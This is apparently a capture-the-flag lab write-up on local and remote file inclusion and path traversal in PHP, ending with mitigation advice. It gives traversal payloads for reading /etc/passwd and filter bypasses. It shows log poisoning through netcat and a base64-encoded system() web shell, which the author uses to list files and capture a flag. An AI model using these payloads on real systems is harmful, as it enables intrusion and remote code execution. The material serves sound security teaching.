# Introduction
---
File Inclusion and Path Traversal are vulnerabilities that arise when an application allows external input to change the path for accessing files. For example, imagine a library where the catalogue system is manipulated to access restricted books not meant for public viewing. Similarly, in web applications, the vulnerabilities primarily arise from improper handling of file paths and URLs. These vulnerabilities allow attackers to include files not intended to be part of the web application, leading to unauthorized access or execution of code.

#### Objectives

1. Understand what File Inclusion and Path Traversal attacks are and their impact.
2. Identify File Inclusion and Path Traversal vulnerabilities in web applications.
3. Exploit these vulnerabilities in a controlled environment.
4. Understand and apply measures to mitigate and prevent these vulnerabilities.

#### Prerequisites

1. Basic understanding of web application architecture and server-side scripting.
2. Familiarity with common programming languages used in web development, likeÂ PHP.  
3. Basic knowledge ofÂ [OWASPÂ ZAP](https://tryhackme.com/jr/learnowaspzap)Â orÂ [Burp Suite](https://tryhackme.com/room/burpsuitebasics).
4. Basic knowledge ofÂ [File Inclusion](https://tryhackme.com/jr/fileinc)Â vulnerabilities.


# Web Application Architecture
---
#### Structure of a Web Application

Web applications are complex systems comprising several components working together to deliver a seamless user experience. At its core, a web application has two main parts: the frontend and the backend.

1. **Frontend:**Â This is the user interface of the application, typically built using frameworks like React, Angular, or Vue.js. It communicates with the backend via APIs.
    
2. **Backend:**Â This server-side component processes user requests, interacts with databases, and serves data to the frontend. It's often developed using languages likeÂ PHP, Python, and Javascript and frameworks like Node.js, Django, or Laravel.
    

One of the fundamental aspects of web applications is the client-server model. In this model, the client, usually a web browser, sends a request to the server hosting the web application. The backend server then processes this request and sends back a response. The client and server communication usually happens over theÂ HTTP/HTTPS protocols.

![Structure of a web application](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/b4fb94d308d04bd95a6cce14008cf2fd.png)  

### Server-Side Scripting and File Handling  

Server-side scripts run on the server and generate the content of the frontend, which is then sent to the client. Unlike client-side scripts like JavaScript in the browser, server-side scripts can access the server's file system and databases.Â File handling is a significant part of server-side scripting.Â Web applications often need to read from or write to files on the server. For example, reading configuration files, saving user uploads, or including code from other files.

For example, the application below includes a file based on user input.Â 

![Vulnerable application homepage](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/351e3ca1e5071b199ae7e5078b4fee70.png)  

If this input is not correctly validated and sanitized, an attacker might exploit the vulnerable parameter to include malicious files or access sensitive files on the server. In this case, the attacker could view the contents of the server'sÂ **passwd**Â file.

![Vulnerable application a basic file inclusion payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/53daf7efe0faff4ac5fadc3c410ecb64.png)  

In short, file inclusion and path traversal vulnerabilities arise when user inputs are not properly sanitized or validated. Since attackers can inject malicious payloads to log filesÂ `/var/log/apache2/access.log`Â and manipulate file paths to execute the logged payload, an attacker can achieve remote code execution. An attacker may also read configuration files that containÂ sensitive information, like database credentials, if the application returns the file in plaintext. Lastly,Â insufficient error handling may also reveal system paths or file structures, providing clues to attackers about potential targets for path traversal or file inclusion attacks.

# File Inclusion Types
---

#### Basics of File Inclusion

A traversal string, commonly seen asÂ `../`, is used in path traversal attacks to navigate through the directory structure of a file system. It's essentially a way to move up one directory level. Traversal strings are used to access files outside the intended directory.

Relative pathing refers to locating files based on the current directory. For example,Â `include('./folder/file.php')`Â implies thatÂ `file.php`Â is located inside a folder namedÂ `folder`, which is in the same directory as the executing script.

Absolute pathing involves specifying the complete path starting from the root directory. For example,Â `/var/www/html/folder/file.php`Â is an absolute path.

#### Remote File Inclusion

Remote File Inclusion, orÂ RFI, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.

Typically,Â RFIÂ occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files.Â For example, if a web application uses a URL in a GET parameter likeÂ `include.php?page=http://attacker.com/exploit.php`, an attacker can replace the URL with a path to a malicious script.

#### Local File Inclusion

Local File Inclusion, orÂ LFI, typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server.Â Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory.Â For example, using a traversal string,Â an attacker might access sensitive files likeÂ `include.php?page=../../../../etc/passwd`.

WhileÂ LFIÂ primarily leads to unauthorized file access, it can escalate toÂ RCE. This can occur if the attacker can upload or inject executable code into a file that is later included or executed by the server.Â Techniques such as log poisoning, which means injecting code into log files and then including those log files, are examples of howÂ LFIÂ can lead toÂ RCE.

#### RFIÂ vsÂ LFIÂ Exploitation Process

![RFI versus LFI exploitation process](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/51fca7adb2f8deb2d2bd3a83dc4d0c00.png)  

This diagram above differentiates the process of exploitingÂ RFIÂ andÂ LFIÂ vulnerabilities. InÂ RFI, the focus is on including and executing a remote file, whereas, inÂ LFI, the attacker aims to access local files and potentially leverage this access to execute code on the server.

# PHP Wrappers
---

PHPÂ wrappers are part ofÂ PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-inÂ PHPÂ protocols, which may lead to significant security risks if not properly handled.

For instance, an application vulnerable toÂ LFIÂ might include files based on a user-supplied input without sufficient validation. In such cases, attackers can use theÂ `php://filter`Â filter. This filter allows a user to perform basic modification operations on the data before it's read or written. For example, if an attacker wants to encode the contents of an included file likeÂ `/etc/passwd`Â in base64. This can be achieved by using theÂ `convert.base64-encode`Â conversion filter of the wrapper. The final payload will then beÂ `php://filter/convert.base64-encode/resource=/etc/passwd`

For example, go toÂ [http://10.10.172.219/playground.php](http://10.10.172.219/playground.php)Â and use the final payload above.

![Vulnerable application containing the payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f7ffaa4b76733a80bbf34544770de6e5.png)  

Once the application processes this payload, the server will return an encoded content of theÂ **passwd**Â file.

![Vulnerable application returns the encoded value of the requested file](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/099db41dc5da2eb30e7898b3ee0fe979.png)

Which the attacker can then decode to reveal the contents of the target file.  

![Decoded value of the /etc/passwd file](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/30d1aaab9aa2add722fe811e674b1145.png)  

There are many categories of filters inÂ PHP. Some of these are String Filters (string.rot13, string.toupper, string.tolower, and string.strip_tags), Conversion Filters (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, and convert.quoted-printable-decode), Compression Filters (zlib.deflate and zlib.inflate), and Encryption Filters (mcrypt, and mdecrypt) which is now deprecated.

For example, the table below represents the output of the target fileÂ **.htaccess**Â using the different string filters inÂ PHP.

|   |   |
|---|---|
|**Payload**|**Output**|
|php://filter/convert.base64-encode/resource=.htaccess|UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz|
|php://filter/string.rot13/resource=.htaccess|ErjevgrRatvar ba Bcgvbaf -Vaqrkrf|
|php://filter/string.toupper/resource=.htaccess|REWRITEENGINE ON OPTIONS -INDEXES|
|php://filter/string.tolower/resource=.htaccess|rewriteengine on options -indexes|
|php://filter/string.strip_tags/resource=.htaccess|RewriteEngine on Options -Indexes|
|No filter applied|RewriteEngine on Options -Indexes|

#### Data Wrapper

The data stream wrapper is another example ofÂ PHP's wrapper functionality. TheÂ `data://`Â wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.

For example, go toÂ [http://10.10.172.219/playground.php](http://10.10.172.219/playground.php)Â and use the payloadÂ `data:text/plain,<?php%20phpinfo();%20?>`. In the below image, this URL could causeÂ PHPÂ code execution, displaying theÂ PHPÂ configuration details.

![Vulnerable application containing the data payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/da7537e2743e4302afc60c1982384e3a.png)

The breakdown of the payloadÂ `data:text/plain,<?php phpinfo(); ?>`Â is:

- `data:`Â as the URL.
- `mime-type`Â is set asÂ `text/plain`.
- The data part includes aÂ PHPÂ code snippet:Â `<?php phpinfo(); ?>`.

# Base Directory Breakouts
---

In web applications, safeguards are put in place to prevent path traversal attacks. However, these defences are not always foolproof. Below is the code of an application that insists that the filename provided by the user must begin with a predetermined base directory and will also strip out file traversal strings to protect the application from file traversal attacks:

Sample Code

```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```

It's possible to comply with this requirement and navigate to other directories. This can be achieved by appending the necessary directory traversal sequences after the mandatory base folder.

For example, go toÂ [http://10.10.172.219/lfi.php](http://machine_ip/lfi.php)Â and use the payloadÂ `/var/www/html/..//..//..//etc/passwd`.

TheÂ PHPÂ functionÂ `containsStr`Â checks if a substring exists within a string. The if condition checks two things. First, ifÂ `$_GET['page']`Â does not contain the substringÂ `../..`, and ifÂ `$_GET['page']`Â contains the substringÂ `/var/www/html`,Â however,Â `..//..//`Â bypasses this filter because it still effectively navigates up two directories, similar toÂ `../../`. It does not exactly match the blocked patternÂ `../..`Â due to the extra slashes. The extra slashesÂ `//`Â inÂ `..//..//`Â are treated as a single slash by the file system. This meansÂ `../../`Â andÂ `..//..//`Â are functionally equivalent in terms of directory navigation but onlyÂ `../../`Â is explicitly filtered out by the code.

![Vulnerable application containing the ..//..// payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/5465732ced81f3183c2b1443e4ea8503.png)

#### Obfuscation

Obfuscation techniques are often used to bypass basic security filters that web applications might have in place. These filters typically look for obvious directory traversal sequences likeÂ `../`. However, attackers can often evade detection by obfuscating these sequences and still navigate through the server's filesystem.

Encoding transforms characters into a different format. InÂ LFI, attackers commonly use URL encoding (percent-encoding), where characters are represented using percentage symbols followed by hexadecimal values. For instance,Â `../`Â can be encoded or obfuscated in several ways to bypass simple filters.

- Standard URL Encoding:Â `../`Â becomesÂ `%2e%2e%2f`
- Double Encoding: Useful if the application decodes inputs twice.Â `../`Â becomesÂ `%252e%252e%252f`
- Obfuscation: Attackers can use payloads likeÂ `....//`, which help in avoiding detection by simple string matching or filtering mechanisms. This obfuscation technique is intended to conceal directory traversal attempts, making them less apparent to basic security filters.

For example, imagine an application that mitigatesÂ LFIÂ by filtering outÂ `../`:

Sample Script

```php
$file = $_GET['file'];
$file = str_replace('../', '', $file);

include('files/' . $file);
```

An attacker can potentially bypass this filter using the following methods:

1. **URL Encoded Bypass:**Â The attacker can use the URL-encoded version of the payload likeÂ `?file=%2e%2e%2fconfig.php`. The server decodes this input toÂ `../config.php`, bypassing the filter.
    
2. **Double Encoded Bypass:**Â The attacker can use double encoding if the application decodes inputs twice. The payload would then beÂ `?file=%252e%252e%252fconfig.php`, where a dot isÂ `%252e`, and a slash isÂ `%252f`. The first decoding step changesÂ `%252e%252e%252f`Â toÂ `%2e%2e%2f`. The second decoding step then translates it toÂ `../config.php`.
    
3. **Obfuscation:**Â An attacker could use the payloadÂ `....//config.php`, which, after the application strips out the apparent traversal string, would effectively becomeÂ `../config.php`.


# LFI2RCE - Session Files
---

#### PHPÂ Session Files

PHPÂ session files can also be used in anÂ LFIÂ attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through anÂ LFIÂ vulnerability, this can lead to code execution.

For example, the vulnerable application hosted inÂ [http://10.10.172.219/sessions.php](http://10.10.172.219/sessions.php)Â contains the below code:

Sample Code

```php
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}
```

An attacker could exploit this vulnerability by injecting aÂ PHPÂ code into their session variable by usingÂ `<?php echo phpinfo(); ?>`Â in the page parameter.

![sessions.php with a basic phpinfo code](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/110472d2d2ae7b090b8242b3b1a3818e.png)  

This code is then saved in the session file on the server. Subsequently, the attacker can use theÂ LFIÂ vulnerability to include this session file. Since sessionÂ IDsÂ are hashed, the ID can be found in the cookies section of your browser.

![Getting the value of the PHPSESSID](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/82474b4664ba1fd739c339861320174b.png)  

Accessing the URLÂ `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]`Â will execute the injectedÂ PHPÂ code in the session file.Â Note that you have to replace [sessionID] with the value from your PHPSESSID cookie.

![Injected php code in the session file has been executed](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/d335c5261b4cfa981521ffeb098a796c.png)

# LFI2RCE - Log Poisoning
---

Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses anÂ LFIÂ vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject maliciousÂ PHPÂ code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once theÂ PHPÂ code is in the log file, the attacker can exploit anÂ LFIÂ vulnerability to include it as a standardÂ PHPÂ file. This causes the server to execute the malicious code contained in the log file, leading toÂ RCE.

For example, if an attacker sends a Netcat request to the vulnerable machine containing aÂ PHPÂ code:

Sample Request

```php
$ nc 10.10.172.219 80      
<?php echo phpinfo(); ?>
HTTP/1.1 400 Bad Request
Date: Thu, 23 Nov 2023 05:39:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 335
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.172.219.eu-west-1.compute.internal Port 80</address>
</body></html>
```

The code will then be logged in the server's access logs.

![Apache access log containing the injected PHP code](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/d9c19f6c916c790bb4fa94e09a5fcaef.png)  

The attacker then usesÂ LFIÂ to include the access log file:Â `?page=/var/log/apache2/access.log`

![Injected PHP code in the web access log has been executed](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f4a675e26aac4f257dfd24942bcdbd0f.png)


# LFI2RCE - Wrappers
----

#### PHPÂ Wrappers

PHPÂ wrappers can also be used not only for reading files but also for code execution.Â The key here is theÂ `php://filter`Â stream wrapper, which enables file transformations on the fly.Â Take theÂ PHPÂ base64 filter as an example. This method allows attackers to execute arbitrary code on the server using a base64-encoded payload.Â 

For example, go toÂ [http://10.10.172.219/playground.php](http://10.10.172.219/playground.php)[](http://10.10.172.219/playground.php).

We will use theÂ PHPÂ codeÂ `<?php system($_GET['cmd']); echo 'Shell done!'; ?>`Â as our payload. The value of the payload, when encoded to base64, will beÂ `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`

|   |   |   |
|---|---|---|
|**Position**|**Field**|**Value**|
|1|Protocol Wrapper|php://filter|
|2|Filter|convert.base64-decode|
|3|Resource Type|resource=|
|4|Data Type|data://plain/text,|
|5|Encoded Payload|PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+|

In the table above,Â `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`Â is the base64-encoded version of theÂ PHPÂ code.Â When the server processes this request, it first decodes the base64 string and then executes theÂ PHPÂ code, allowing the attacker to run commands on the server via the "cmd" GET parameter.  

![Vulnerable application containing the PHP wrapper payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0e01212213a4a512d552b55d22b7014d.png)

**Note:**Â It is important to not include theÂ **&cmd=whoami**Â in the input field since it will be encoded when the form is submitted. Once encoded, the backend will treat it as part of the base64 code, giving you anÂ invalid byte sequence error.

### Practical
---

Let's use this payload to receive the contents of the current directory:

```
http://10.10.172.219/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls
```

![Pasted image 20250506162110.png](../../../IMAGES/Pasted%20image%2020250506162110.png)

We got a flags directory, we can see the contents of it using:

```
http://10.10.172.219/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls%20-la%20flags
```

![Pasted image 20250506162437.png](../../../IMAGES/Pasted%20image%2020250506162437.png)

We can see the file, let's read it:

```
http://10.10.172.219/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat%20flags%2Fcd3c67e5079de2700af6cea0a405f9cc.txt
```

![Pasted image 20250506162524.png](../../../IMAGES/Pasted%20image%2020250506162524.png)

There we go, we got our flag:

```
THM{fl4g_cd3c67e5079de2700af6cea0a405f9cc} 
```

# Conclusion
---

File Inclusion and Path Traversal vulnerabilities arise from improper handling of user-supplied input in web applications. In File Inclusion, attackers exploit the way web applications handle files, leading to Local File Inclusion or Remote File Inclusion. On the other hand, Path Traversal involves navigating the server's directory structure to access files outside the intended directory. Both vulnerabilities can be used to access unauthorized data or system compromise.

#### Mitigation and Prevention Strategies

1. Ensure all user inputs are properly validated and sanitized. This is a crucial step to prevent attackers from manipulating file paths or including malicious files.
2. Implement allowlisting for file inclusion and access. Define which files can be included or accessed and reject any request that does not match these criteria.
3. Configure server settings to disallow remote file inclusion and limit the ability of scripts to access the filesystem. ForÂ PHP, directives likeÂ `allow_url_fopen`Â andÂ `allow_url_include`Â should be disabled if not needed.
4. Performing regular code reviews and security audits to identify potential vulnerabilities with the help of automated tools. Manual checks are also essential.
5. Ensure that everyone involved in the development process understands the importance of security. Regular training on secure coding practices can significantly reduce the risk of this vulnerability.

In conclusion, while File Inclusion and Path Traversal pose significant risks to web applications, they can be mitigated by security best practices. Developers and administrators must be proactive in securing web applications, staying updated on the latest security trends, and continually refining their approach to application security.

